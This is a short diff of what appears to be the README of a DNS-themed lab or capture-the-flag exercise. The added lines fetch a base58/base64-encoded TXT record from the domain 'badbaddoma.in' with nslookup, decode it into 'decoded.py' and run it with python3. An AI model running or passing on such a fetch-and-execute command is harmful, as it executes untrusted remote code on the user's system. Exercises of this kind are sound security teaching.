@@ -54,11 +54,9 @@ Check this [article](https://en.wikipedia.org/wiki/Domain_Name_System)
 - Read the TASK file carefully, you will thank me later, spent time on this ... 
 
 ```bash
- nslookup -type=txt REDACTED.badbaddoma.in |grep "Ye" |cut -d \" -f2 > .mal.py
+ nslookup -type=txt REDACTED.badbaddoma.in |grep "Ye" |cut -d \" -f2 |base58 -d |base64 -d > decoded.py
 
- # NOTE: You can just decode the text using good old bash,  not the python script
-
-echo "REDACTED" |base58 -d |base64 -d
+ python3 decoded.py
  
 
 ```
